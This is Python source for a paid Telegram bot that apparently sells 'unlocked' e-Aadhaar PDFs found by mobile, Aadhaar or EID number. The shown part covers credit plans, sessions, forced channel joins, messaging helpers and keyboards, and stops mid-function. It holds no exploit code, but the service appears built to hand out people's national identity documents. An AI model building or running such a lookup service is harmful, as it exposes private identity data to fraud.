import sys
import io
import html
# Force UTF-8 output on Windows consoles with line buffering
if sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace', line_buffering=True)

import requests
import json
import base64
import uuid
import re
from datetime import datetime
import os
import time
import logging
from io import BytesIO
from urllib.parse import urlparse
import PyPDF2
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import emoji
from typing import Optional, Dict, Any, Tuple
from dotenv import load_dotenv

load_dotenv()

# Import Database & UPI Gateway & UIDAI API
import database
from database import (
    ensure_user, get_user, get_credits, is_lifetime, has_credits,
    add_credits, deduct_credit, ban_user, unban_user, is_banned, all_users,
    is_utr_claimed, record_successful_payment
)
from upi_gateway import gateway
from api import bot_api

# ============== LOGGING SETUP ==============
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============== SMALL CAPS TYPOGRAPHY HELPERS ==============
SMALL_CAPS_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ',
    'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ',
    'q': 'ǫ', 'r': 'ʀ', 's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x',
    'y': 'ʏ', 'z': 'ᴢ',
    'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ',
    'I': 'ɪ', 'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ',
    'Q': 'ǫ', 'R': 'ʀ', 'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x',
    'Y': 'ʏ', 'Z': 'ᴢ'
}

REVERSE_SC = {
    'ᴀ': 'a', 'ʙ': 'b', 'ᴄ': 'c', 'ᴅ': 'd', 'ᴇ': 'e', 'ғ': 'f', 'ɢ': 'g', 'ʜ': 'h',
    'ɪ': 'i', 'ᴊ': 'j', 'ᴋ': 'k', 'ʟ': 'l', 'ᴍ': 'm', 'ɴ': 'n', 'ᴏ': 'o', 'ᴘ': 'p',
    'ǫ': 'q', 'ʀ': 'r', 's': 's', 'ᴛ': 't', 'ᴜ': 'u', 'ᴠ': 'v', 'ᴡ': 'w', 'x': 'x',
    'ʏ': 'y', 'ᴢ': 'z'
}

def to_sc(text):
    if not text:
        return text
    return ''.join(SMALL_CAPS_MAP.get(c, c) for c in text)

def from_sc(text):
    if not text:
        return text
    return ''.join(REVERSE_SC.get(c, c) for c in text)

# ============== BOT & CREDENTIALS CONFIG ==============
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
BOT_NAME           = "🎁 ᴀᴀᴅʜᴀᴀʀ·ɢʀᴀᴍ"
DIVIDER            = "━━━━━━━━━━━━━━━━━━━━━━━"
OWNER_ID           = int(os.environ.get("OWNER_ID", "8267676849"))
OWNER_USERNAME     = os.environ.get("OWNER_USERNAME", "@apifounder")
STORAGE_CHAT       = os.environ.get("STORAGE_CHAT", "@NagiNaverDie")
# Dynamic Channel Configuration with MongoDB persistence
_init_ch = database.get_channel_config(
    default_id=os.environ.get("CHANNEL_ID", "-1002894475319"),
    default_link=os.environ.get("CHANNEL_LINK", "https://t.me/+Vq7Ha3AVq4JjNTNl")
)
CHANNEL_ID         = _init_ch.get("channel_id", "-1002894475319")
CHANNEL_LINK       = _init_ch.get("channel_link", "https://t.me/+Vq7Ha3AVq4JjNTNl")
FORCE_CHECK        = _init_ch.get("force_check", True)

def get_channel_id():
    return database.get_channel_config().get("channel_id", "-1002894475319")

def get_channel_link():
    return database.get_channel_config().get("channel_link", "https://t.me/+Vq7Ha3AVq4JjNTNl")

def is_force_check_enabled():
    return database.get_channel_config().get("force_check", True)

SESSION_TIMEOUT    = 60

# Parse Admin IDs
ADMIN_IDS = set()
for a in os.environ.get("ADMIN_IDS", "8267676849,8901139503,8327823004").split(","):
    a = a.strip()
    if a.isdigit():
        ADMIN_IDS.add(int(a))
if OWNER_ID:
    ADMIN_IDS.add(OWNER_ID)

def is_admin(user_id):
    try:
        uid = int(user_id)
        return uid in ADMIN_IDS or uid == OWNER_ID
    except Exception:
        return False

# Indian UPI Credit Pricing Plans (Small Caps Styled)
PLANS = {
    '50':  {'credits': 25,  'price': '₹50',  'amount': 50,  'lifetime': False, 'label': '⚡ sᴛᴀʀᴛᴇʀ (25 ᴄʀᴇᴅɪᴛs)'},
    '100': {'credits': 60,  'price': '₹100', 'amount': 100, 'lifetime': False, 'label': '🔥 ᴘᴏᴘᴜʟᴀʀ (60 ᴄʀᴇᴅɪᴛs)'},
    '250': {'credits': 160, 'price': '₹250', 'amount': 250, 'lifetime': False, 'label': '💎 ᴘʀᴏ (160 ᴄʀᴇᴅɪᴛs)'},
    '500': {'credits': 0,   'price': '₹500', 'amount': 500, 'lifetime': True,  'label': '👑 ʟɪғᴇᴛɪᴍᴇ ᴠɪᴘ (ᴜɴʟɪᴍɪᴛᴇᴅ)'},
}

worker_pool = ThreadPoolExecutor(max_workers=8)

# ============== PROXY CONFIG ==============
PROXY_CONFIG = {'use_proxy': False, 'http': None, 'https': None}
PROXY_URL = os.environ.get("PROXY_URL", "").strip()

def create_session(use_proxy=False, proxy_string=None):
    session = requests.Session()
    # Optimized pool with fast retry (1 retry) for instant throughput
    session.mount('https://', requests.adapters.HTTPAdapter(
        pool_connections=30, pool_maxsize=60, max_retries=1, pool_block=False
    ))
    if use_proxy and proxy_string:
        parsed = urlparse(proxy_string)
        proxy_url = f"{parsed.scheme}://{parsed.netloc}"
        PROXY_CONFIG['use_proxy'] = True
        PROXY_CONFIG['http'] = proxy_url
        PROXY_CONFIG['https'] = proxy_url
        session.proxies = {'http': proxy_url, 'https': proxy_url}
        logger.info(f"Proxy set: {proxy_url}")
    else:
        PROXY_CONFIG['use_proxy'] = False
        PROXY_CONFIG['http'] = None
        PROXY_CONFIG['https'] = None
    return session

telegram_session = None
polling_session = None

def get_telegram_session():
    global telegram_session
    if telegram_session is None:
        if PROXY_URL:
            telegram_session = create_session(True, PROXY_URL)
        else:
            telegram_session = create_session(False)
    return telegram_session

def get_polling_session():
    global polling_session
    if polling_session is None:
        if PROXY_URL:
            polling_session = create_session(True, PROXY_URL)
        else:
            polling_session = create_session(False)
    return polling_session

# UIDAI API Instance
bot = bot_api

# ============== CUSTOM EMOJIS & RAW EMOJI BOXING ==============
# Emojis with verified Custom Emoji IDs get <tg-emoji>.
# Every raw emoji without a custom ID is cleanly boxed in <code>emoji</code>.
# Verified Premium Custom Emojis (Telegram 7.0+)
CUSTOM_EMOJIS = {
    '⚡': '5456140674028019486',
    '⚡️': '5456140674028019486',
    '📱': '6201882038975341348',
    '📱️': '6201882038975341348',
    '🪪': '5890864241388293875',
    '🪪️': '5890864241388293875',
    '🔢': '5226513232549664618',
    '🔢️': '5226513232549664618',
    '💎': '5427168083074628963',
    '💎️': '5427168083074628963',
    '🛒': '5258024802010026053',
    '🛒️': '5258024802010026053',
    '🔗': '6113813004426416777',
    '🔗️': '6113813004426416777',
    '❓': '5436113877181941026',
    '❓️': '5436113877181941026',
    '📢': '6305206294848475991',
    '📢️': '6305206294848475991',
    '✅': '6275829594717165532',
    '✅️': '6275829594717165532',
    '❌': '6305324410744084248',
    '❌️': '6305324410744084248',
    '👑': '6237927637906364256',
    '👑️': '6237927637906364256',
    '💰': '6244678063775289843',
    '💰️': '6244678063775289843',
    '👤': '6305229569276254220',
    '👤️': '6305229569276254220',
    '⏳': '5386367538735104399',
    '⏳️': '5386367538735104399',
    '🔄': '5030872266716480568',
    '🔄️': '5030872266716480568',
    '🔐': '5296369303661067030',
    '🔐️': '5296369303661067030',
    '🔑': '5296369303661067030',
    '🔑️': '5296369303661067030',
    '🔒': '4956719506027185156',
    '🔒️': '4956719506027185156',
    '🔓': '5890882606668452641',
    '🔓️': '5890882606668452641',
    '📄': '5258477770735885832',
    '📄️': '5258477770735885832',
    '⭐': '5372849966689566579',
    '⭐️': '5372849966689566579',
    '🚀': '5359664288241829619',
    '🚀️': '5359664288241829619',
    '🛡': '6235476345451716705',
    '🛡️': '6235476345451716705',
    '⚠️': '5274099962655816924',
    '⚠': '5274099962655816924',
    '🎁': '5084613633418199991',
    '🎁️': '5084613633418199991',
    '🔥': '5289722755871162900',
    '🔥️': '5289722755871162900',
    '🥷': '5289722755871162900',
    '1️⃣': '6141182593325862850',
    '2️⃣': '6140858267460440006',
    '3️⃣': '6140761832559742520',
    '4️⃣': '6143358763060433247',
    '5️⃣': '6140671341893784411',
    '📅': '6235449188373502693',
    '📋': '5203910550542631009',
    '📌': '5397782960512444700',
    '🔍': '5362061893605279054',
    '🔙': '6276030448862763508',
    '👋': '6204139486671019705',
    '🇮🇳': '6147942648511469492',
    '🇮🇳️': '6147942648511469492',
}

def format_custom_emojis(text):
    if not text or not isinstance(text, str):
        return text

    # Protect pre-existing code and tg-emoji blocks
    saved_blocks = {}
    def save_block(m):
        tok = f"__SAVED_BLK_{len(saved_blocks)}__"
        saved_blocks[tok] = m.group(0)
        return tok

    text = re.sub(r'<code>[\s\S]*?</code>', save_block, text)
    text = re.sub(r'<tg-emoji[\s\S]*?</tg-emoji>', save_block, text)

    # Replace verified emojis with <tg-emoji>
    if CUSTOM_EMOJIS:
        sorted_emojis = sorted(CUSTOM_EMOJIS.keys(), key=len, reverse=True)
        for i, em in enumerate(sorted_emojis):
            eid = CUSTOM_EMOJIS[em]
            if em in text:
                tok = f"__CUST_{i}_{eid}__"
                saved_blocks[tok] = f'<tg-emoji emoji-id="{eid}">{em}</tg-emoji>'
                text = text.replace(em, tok)

    # Restore all protected blocks
    for tok, orig in saved_blocks.items():
        text = text.replace(tok, orig)

    return text

# ============== SESSION MANAGEMENT ==============
user_sessions   = {}
_sessions_lock  = threading.Lock()

def get_session(chat_id):
    with _sessions_lock:
        return user_sessions.get(chat_id, {'step': 'main', 'data': {}, 'last_activity': time.time()})

def set_session(chat_id, step, data=None):
    with _sessions_lock:
        existing = user_sessions.get(chat_id, {})
        d = data if data is not None else existing.get('data', {})
        user_sessions[chat_id] = {'step': step, 'data': d, 'last_activity': time.time()}

def update_session_data(chat_id, key, value):
    with _sessions_lock:
        if chat_id not in user_sessions:
            user_sessions[chat_id] = {'step': 'main', 'data': {}, 'last_activity': time.time()}
        user_sessions[chat_id]['data'][key] = value
        user_sessions[chat_id]['last_activity'] = time.time()

def clear_session(chat_id):
    with _sessions_lock:
        user_sessions[chat_id] = {'step': 'main', 'data': {}, 'last_activity': time.time()}

def touch_session(chat_id):
    with _sessions_lock:
        if chat_id in user_sessions:
            user_sessions[chat_id]['last_activity'] = time.time()

def _cleanup_sessions():
    while True:
        time.sleep(20)
        try:
            expired = []
            with _sessions_lock:
                for cid, s in list(user_sessions.items()):
                    step = s.get('step', 'main')
                    if step != 'main':
                        if step in ('awaiting_utr', 'downloading', 'awaiting_admin_create_code', 'admin_awaiting_create_code', 'awaiting_redeem_code'):
                            continue
                        idle = time.time() - s.get('last_activity', time.time())
                        if idle > SESSION_TIMEOUT:
                            user_sessions[cid] = {'step': 'main', 'data': {}, 'last_activity': time.time()}
                            expired.append(cid)
            for cid in expired:
                try:
                    send_message(cid,
                        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                        f"<b>⏰ sᴇssɪᴏɴ ᴇxᴘɪʀᴇᴅ</b>\n\n"
                        f"⚠️  ʀᴇᴀsᴏɴ   ·  ɪᴅʟᴇ ғᴏʀ 60 sᴇᴄᴏɴᴅs\n"
                        f"✅  ᴄʀᴇᴅɪᴛs  ·  ɴᴏᴛ ᴅᴇᴅᴜᴄᴛᴇᴅ\n\n"
                        f"{DIVIDER}\n"
                        f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ.</i>",
                        reply_markup=get_menu_keyboard()
                    )
                except Exception:
                    pass
        except Exception as e:
            logger.error(f"Session cleanup error: {e}")

# ============== CHANNEL MEMBERSHIP ==============
# Channel membership in-memory cache to avoid repeated Telegram API round-trips
_channel_member_cache = {}
_cm_lock = threading.Lock()
CM_CACHE_TTL = 180.0  # 3 minutes cache for channel members

def is_channel_member(user_id):
    if not is_force_check_enabled():
        return True
    uid = str(user_id)
    with _cm_lock:
        item = _channel_member_cache.get(uid)
        if item and (time.time() - item['t']) < CM_CACHE_TTL:
            return item['is_member']

    ch_id = get_channel_id()
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChatMember"
    params = {'chat_id': ch_id, 'user_id': user_id}
    try:
        response = get_telegram_session().get(url, params=params, timeout=5).json()
        if response.get('ok'):
            status = response.get('result', {}).get('status', '')
            is_mem = status in ['member', 'administrator', 'creator']
            with _cm_lock:
                _channel_member_cache[uid] = {'t': time.time(), 'is_member': is_mem}
            return is_mem

        desc = response.get('description', '')
        # If bot is not in the channel or chat not found, avoid total lock-out
        if 'chat not found' in desc.lower() or 'bot is not a member' in desc.lower():
            logger.warning(f"Bot cannot check membership in {ch_id}: {desc}. Please ensure bot is added as Administrator to channel.")
            return True

        with _cm_lock:
            _channel_member_cache[uid] = {'t': time.time(), 'is_member': False}
        return False
    except Exception as e:
        logger.error(f"Error checking channel membership: {e}")
        return True

def remove_reply_keyboard(chat_id):
    """Sends a quick temporary message with remove_keyboard to ensure Telegram client closes bottom keyboard."""
    try:
        res = send_message(chat_id, "<i>⚡ ʟᴏᴀᴅɪɴɢ…</i>", reply_markup={'remove_keyboard': True})
        if res and res.get('ok'):
            mid = res.get('result', {}).get('message_id')
            if mid:
                delete_message(chat_id, mid)
    except Exception as e:
        logger.debug(f"Error removing keyboard: {e}")

_bot_username = None
def get_bot_username():
    global _bot_username
    if _bot_username:
        return _bot_username
    try:
        r = get_telegram_session().get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe", timeout=10).json()
        if r.get('ok'):
            _bot_username = r['result']['username']
            return _bot_username
    except Exception:
        pass
    return "Aadhaar_PdfBot"

# ============== TELEGRAM HELPERS ==============
def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    text = format_custom_emojis(text)
    payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    if reply_markup:
        payload['reply_markup'] = reply_markup
    try:
        response = get_telegram_session().post(url, json=payload, timeout=10)
        res = response.json()
        if not res.get('ok'):
            logger.error(f"Telegram sendMessage failed for chat {chat_id}: {res}")
            if 'parse entities' in str(res.get('description', '')).lower():
                payload['text'] = re.sub(r'<[^>]+>', '', text)
                payload['parse_mode'] = None
                return get_telegram_session().post(url, json=payload, timeout=10).json()
        return res
    except Exception as e:
        logger.error(f"Error sending message: {e}")
        return None

def edit_message_text(chat_id, message_id, text, reply_markup=None):
    if not message_id:
        return None
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    text = format_custom_emojis(text)
    payload = {'chat_id': chat_id, 'message_id': message_id, 'text': text, 'parse_mode': 'HTML'}
    if reply_markup:
        payload['reply_markup'] = reply_markup
    try:
        response = get_telegram_session().post(url, json=payload, timeout=10)
        res = response.json()
        if not res.get('ok'):
            desc = str(res.get('description', '')).lower()
            if 'message is not modified' in desc:
                return res
            if 'parse entities' in desc:
                payload['text'] = re.sub(r'<[^>]+>', '', text)
                payload['parse_mode'] = None
                return get_telegram_session().post(url, json=payload, timeout=10).json()
            logger.debug(f"editMessageText non-ok for {chat_id}/{message_id}: {res}")
        return res
    except Exception as e:
        logger.debug(f"Error editing message {message_id}: {e}")
        return None

def answer_callback_query(callback_query_id, text=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    data = {'callback_query_id': callback_query_id}
    if text:
        data['text'] = text
    try:
        get_telegram_session().post(url, json=data, timeout=5)
    except Exception as e:
        logger.error(f"Error answering callback: {e}")

def set_message_reaction(chat_id, message_id=None, emoji="⚡"):
    """Telegram Bot API 7.0+ Message Reactions"""
    if not message_id:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setMessageReaction"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "reaction": [{"type": "emoji", "emoji": emoji}],
        "is_big": True
    }
    try:
        get_telegram_session().post(url, json=payload, timeout=5)
    except Exception as e:
        logger.debug(f"Reaction error: {e}")

def delete_message(chat_id, message_id):
    """Deletes a message from chat via Telegram Bot API"""
    if not message_id:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteMessage"
    try:
        resp = get_telegram_session().post(url, json={"chat_id": chat_id, "message_id": message_id}, timeout=5)
        return resp.status_code == 200
    except Exception as e:
        logger.debug(f"Error deleting message {message_id}: {e}")
        return False

def send_photo(chat_id, photo_bytes, caption=None, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    files = {'photo': ('qr_code.png', photo_bytes, 'image/png')}
    data = {'chat_id': chat_id, 'parse_mode': 'HTML'}
    if caption:
        data['caption'] = format_custom_emojis(caption)
    if reply_markup:
        data['reply_markup'] = json.dumps(reply_markup)
    try:
        response = get_telegram_session().post(url, data=data, files=files, timeout=20)
        return response.json()
    except Exception as e:
        logger.error(f"Error sending photo: {e}")
        return None

def send_document(chat_id, file_path, caption=None, filename="Aadhaar.pdf"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    if caption:
        caption = format_custom_emojis(caption)
    try:
        with open(file_path, 'rb') as f:
            files = {'document': (filename, f, 'application/pdf')}
            data = {'chat_id': chat_id, 'parse_mode': 'HTML'}
            if caption:
                data['caption'] = caption
            response = get_telegram_session().post(url, data=data, files=files, timeout=30).json()
            if not response.get('ok'):
                logger.error(f"Telegram sendDocument failed for chat {chat_id}: {response}")
                if 'parse entities' in str(response.get('description', '')).lower():
                    f.seek(0)
                    data['parse_mode'] = None
                    data['caption'] = re.sub(r'<[^>]+>', '', caption) if caption else None
                    response = get_telegram_session().post(url, data=data, files=files, timeout=30).json()
        return response
    except Exception as e:
        logger.error(f"Error sending document: {e}")
        return None

# ============== KEYBOARDS (SMALL CAPS & 100% INLINE) ==============
def get_main_keyboard():
    # Deprecated reply keyboard: ensures client drops any persistent bottom keyboard
    return {'remove_keyboard': True}

def get_menu_keyboard():
    return {
        'inline_keyboard': [
            [
                {'text': 'ᴍᴀɪɴ ᴍᴇɴᴜ', 'callback_data': 'start', 'icon_custom_emoji_id': '5030872266716480568', 'style': 'primary'},
                {'text': 'ʙᴜʏ ᴄʀᴇᴅɪᴛs', 'callback_data': 'buy', 'icon_custom_emoji_id': '5258024802010026053', 'style': 'success'}
            ]
        ]
    }

def get_welcome_inline_keyboard():
    return {
        'inline_keyboard': [
            [
                {'text': 'ᴍᴏʙɪʟᴇ', 'callback_data': 'search_mobile', 'icon_custom_emoji_id': '6201882038975341348', 'style': 'primary'},
                {'text': 'ᴀᴀᴅʜᴀᴀʀ', 'callback_data': 'search_aadhaar', 'icon_custom_emoji_id': '5890864241388293875', 'style': 'primary'},
                {'text': 'ᴇɪᴅ', 'callback_data': 'search_eid', 'icon_custom_emoji_id': '5226513232549664618', 'style': 'primary'}
            ],
            [
                {'text': 'ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ', 'callback_data': 'search_firebase', 'icon_custom_emoji_id': '5289722755871162900', 'style': 'primary'}
            ],
            [
                {'text': 'ᴄʀᴇᴅɪᴛs', 'callback_data': 'credits', 'icon_custom_emoji_id': '5427168083074628963', 'style': 'success'},
                {'text': 'ʙᴜʏ ᴄʀᴇᴅɪᴛs', 'callback_data': 'buy', 'icon_custom_emoji_id': '5258024802010026053', 'style': 'success'},
                {'text': 'ʀᴇғᴇʀʀᴀʟ', 'callback_data': 'referral', 'icon_custom_emoji_id': '6113813004426416777', 'style': 'primary'}
            ],
            [
                {'text': '🎁 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ', 'callback_data': 'claim_code', 'icon_custom_emoji_id': '5084613633418199991', 'style': 'primary'},
                {'text': 'ʜᴇʟᴘ & ɢᴜɪᴅᴇ', 'callback_data': 'help', 'icon_custom_emoji_id': '5436113877181941026', 'style': 'primary'}
            ]
        ]
    }

def get_cancel_keyboard():
    return {'inline_keyboard': [[{'text': 'ᴄᴀɴᴄᴇʟ', 'callback_data': 'cancel', 'icon_custom_emoji_id': '6305324410744084248', 'style': 'danger'}]]}

def get_buy_keyboard():
    return {
        'inline_keyboard': [
            [{'text': '25 ᴄʀᴇᴅɪᴛs — ₹50', 'callback_data': 'buy_50', 'icon_custom_emoji_id': '5456140674028019486', 'style': 'primary'},
             {'text': '60 ᴄʀᴇᴅɪᴛs — ₹100', 'callback_data': 'buy_100', 'icon_custom_emoji_id': '5289722755871162900', 'style': 'success'}],
            [{'text': '160 ᴄʀᴇᴅɪᴛs — ₹250', 'callback_data': 'buy_250', 'icon_custom_emoji_id': '5427168083074628963', 'style': 'primary'},
             {'text': 'ʟɪғᴇᴛɪᴍᴇ ᴠɪᴘ — ₹500', 'callback_data': 'buy_500', 'icon_custom_emoji_id': '6237927637906364256', 'style': 'success'}],
            [{'text': 'ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ', 'callback_data': 'cancel', 'icon_custom_emoji_id': '6276030448862763508', 'style': 'danger'}]
        ]
    }

def get_credits_keyboard():
    return {
        'inline_keyboard': [
            [
                {'text': 'ʙᴜʏ ᴄʀᴇᴅɪᴛs', 'callback_data': 'buy', 'icon_custom_emoji_id': '5258024802010026053', 'style': 'success'},
                {'text': 'ʀᴇғᴇʀʀᴀʟ', 'callback_data': 'referral', 'icon_custom_emoji_id': '6113813004426416777', 'style': 'primary'}
            ],
            [
                {'text': 'ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ', 'callback_data': 'cancel', 'icon_custom_emoji_id': '6276030448862763508', 'style': 'danger'}
            ]
        ]
    }

def get_referral_keyboard(link):
    share_url = f"https://t.me/share/url?url={link}&text=Download%20Unlocked%20e-Aadhaar%20PDF%20Instantly%20on%20Telegram!"
    return {
        'inline_keyboard': [
            [
                {'text': 'sʜᴀʀᴇ ɪɴᴠɪᴛᴇ ʟɪɴᴋ', 'url': share_url, 'icon_custom_emoji_id': '6204139486671019705', 'style': 'primary'}
            ],
            [
                {'text': 'ᴍʏ ᴄʀᴇᴅɪᴛs', 'callback_data': 'credits', 'icon_custom_emoji_id': '5427168083074628963', 'style': 'success'},
                {'text': 'ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ', 'callback_data': 'cancel', 'icon_custom_emoji_id': '6276030448862763508', 'style': 'danger'}
            ]
        ]
    }

def get_help_keyboard():
    return {
        'inline_keyboard': [
            [
                {'text': 'ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ', 'callback_data': 'search_firebase', 'icon_custom_emoji_id': '5289722755871162900', 'style': 'primary'},
                {'text': 'ʙᴜʏ ᴄʀᴇᴅɪᴛs', 'callback_data': 'buy', 'icon_custom_emoji_id': '5258024802010026053', 'style': 'success'}
            ],
            [
                {'text': 'ᴄᴏɴᴛᴀᴄᴛ sᴜᴘᴘᴏʀᴛ', 'url': f"https://t.me/{OWNER_USERNAME.lstrip('@')}", 'icon_custom_emoji_id': '6201882038975341348'},
                {'text': 'ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ', 'url': get_channel_link(), 'icon_custom_emoji_id': '6305206294848475991'}
            ],
            [
                {'text': 'ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ', 'callback_data': 'cancel', 'icon_custom_emoji_id': '6276030448862763508', 'style': 'danger'}
            ]
        ]
    }

def get_channel_invite_url():
    """Retrieves current channel invite link."""
    return get_channel_link()

def get_join_keyboard():
    return {
        'inline_keyboard': [
            [{'text': 'ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ', 'url': get_channel_link(), 'icon_custom_emoji_id': '6305206294848475991', 'style': 'primary'}],
            [{'text': 'ɪ ʜᴀᴠᴇ ᴊᴏɪɴᴇᴅ',    'callback_data': 'check_join', 'icon_custom_emoji_id': '6275829594717165532', 'style': 'success'}],
        ]
    }

def get_admin_keyboard():
    fc_status = "ON" if is_force_check_enabled() else "OFF"
    fc_emoji = '6275829594717165532' if is_force_check_enabled() else '6305324410744084248'
    return {
        'inline_keyboard': [
            [{'text': 'sᴛᴀᴛɪsᴛɪᴄs',       'callback_data': 'admin_stats', 'icon_custom_emoji_id': '6204093414556834971', 'style': 'primary'},
             {'text': 'ᴜsᴇʀ ʟɪsᴛ',        'callback_data': 'admin_users', 'icon_custom_emoji_id': '6305229569276254220', 'style': 'primary'}],
            [{'text': 'ɢʀᴀɴᴛ ᴄʀᴇᴅɪᴛs',    'callback_data': 'admin_send_prompt', 'icon_custom_emoji_id': '5084613633418199991', 'style': 'success'},
             {'text': 'ᴜsᴇʀ ʟᴏᴏᴋᴜᴘ',      'callback_data': 'admin_userinfo_prompt', 'icon_custom_emoji_id': '5362061893605279054', 'style': 'primary'}],
            [{'text': 'ʙᴀɴ ᴜsᴇʀ',         'callback_data': 'admin_ban_prompt', 'icon_custom_emoji_id': '5240241223632954241', 'style': 'danger'},
             {'text': 'ᴜɴʙᴀɴ ᴜsᴇʀ',       'callback_data': 'admin_unban_prompt', 'icon_custom_emoji_id': '6275829594717165532', 'style': 'success'}],
            [{'text': 'ᴄʜᴀɴɴᴇʟ sᴇᴛᴛɪɴɢs', 'callback_data': 'admin_channel_menu', 'icon_custom_emoji_id': '6305206294848475991', 'style': 'primary'},
             {'text': 'ʙʀᴏᴀᴅᴄᴀsᴛ',        'callback_data': 'admin_broadcast_prompt', 'icon_custom_emoji_id': '6305206294848475991', 'style': 'primary'}],
            [{'text': '🎁 ᴄʀᴇᴀᴛᴇ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ', 'callback_data': 'admin_create_code_prompt', 'icon_custom_emoji_id': '5084613633418199991', 'style': 'success'},
             {'text': '📋 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs ʟɪsᴛ',  'callback_data': 'admin_codes_list', 'icon_custom_emoji_id': '5203910550542631009', 'style': 'primary'}],
            [{'text': f'ғᴏʀᴄᴇ ᴊᴏɪɴ: {fc_status}', 'callback_data': 'admin_toggle_force_check', 'icon_custom_emoji_id': fc_emoji, 'style': 'primary'}],
        ]
    }

def show_admin_channel_menu(chat_id):
    cfg = database.get_channel_config()
    ch_id = cfg.get("channel_id", "-1002894475319")
    ch_link = cfg.get("channel_link", "https://t.me/+Vq7Ha3AVq4JjNTNl")
    fc_txt = "ON" if cfg.get("force_check", True) else "OFF"
    fc_emoji = '6275829594717165532' if cfg.get("force_check", True) else '6305324410744084248'
    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>📢 ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ sᴇᴛᴛɪɴɢs</b>\n\n"
        f"🆔  <b>ᴄʜᴀɴɴᴇʟ ɪᴅ:</b> <code>{ch_id}</code>\n"
        f"🔗  <b>ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b> {ch_link}\n"
        f"🛡️  <b>ғᴏʀᴄᴇ ᴊᴏɪɴ:</b> <b>{fc_txt}</b>\n\n"
        f"<i>💡 ʙᴏᴛ ᴋᴏ ᴄʜᴀɴɴᴇʟ ᴍᴀɪɴ ᴀᴅᴍɪɴɪsᴛʀᴀᴛᴏʀ ʙᴀɴᴀɴᴀ ᴢᴀʀᴏᴏʀɪ ʜᴀɪ.</i>",
        reply_markup={
            'inline_keyboard': [
                [{'text': 'ᴄʜᴀɴɢᴇ ᴄʜᴀɴɴᴇʟ', 'callback_data': 'admin_change_channel_prompt', 'icon_custom_emoji_id': '5203910550542631009', 'style': 'primary'}],
                [{'text': f'ᴛᴏɢɢʟᴇ ғᴏʀᴄᴇ ᴊᴏɪɴ ({fc_txt})', 'callback_data': 'admin_toggle_force_check', 'icon_custom_emoji_id': fc_emoji, 'style': 'primary'}],
                [{'text': 'ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ', 'callback_data': 'admin_back', 'icon_custom_emoji_id': '6276030448862763508', 'style': 'danger'}]
            ]
        }
    )

# PAYMENT SCREEN KEYBOARD (CHECK STATUS & CANCEL)
def get_payment_keyboard(plan_key):
    return {
        'inline_keyboard': [
            [{'text': 'ᴄʜᴇᴄᴋ sᴛᴀᴛᴜs', 'callback_data': f'checkpay_{plan_key}', 'style': 'primary', 'icon_custom_emoji_id': '5030872266716480568'}],
            [{'text': 'ᴄᴀɴᴄᴇʟ', 'callback_data': 'cancel', 'icon_custom_emoji_id': '6305324410744084248', 'style': 'danger'}]
        ]
    }

# ============== SHARED DISPLAY HELPERS ==============
def show_credits_info(chat_id):
    u = get_user(chat_id)
    cr = get_credits(chat_id)
    cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ" if cr == float('inf') else str(int(cr))
    ref_count = u.get('referral_count', 0) if u else 0
